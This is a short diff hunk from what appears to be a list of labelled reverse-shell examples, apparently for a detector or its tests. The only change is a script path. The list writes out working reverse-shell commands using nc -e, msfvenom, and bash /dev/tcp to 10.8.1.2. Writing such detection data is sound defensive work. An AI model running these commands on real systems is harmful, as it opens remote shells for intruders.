@@ -29,7 +29,7 @@ REVSHELL = [
     "nc -e /bin/bash 10.8.1.2 1337",
     "rlwrap nc -lvnp 9001",
     "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.1.2 LPORT=443 -f elf -o sh.elf",
-    "bash /root/vm.sh \"python3 wp2shell.py shell --cmd 'bash -i >& /dev/tcp/10.8.1.2/443 0>&1' http://t\"",
+    "bash ~/.torch/vm.sh \"python3 wp2shell.py shell --cmd 'bash -i >& /dev/tcp/10.8.1.2/443 0>&1' http://t\"",
 ]
 
 NOT_REVSHELL = [
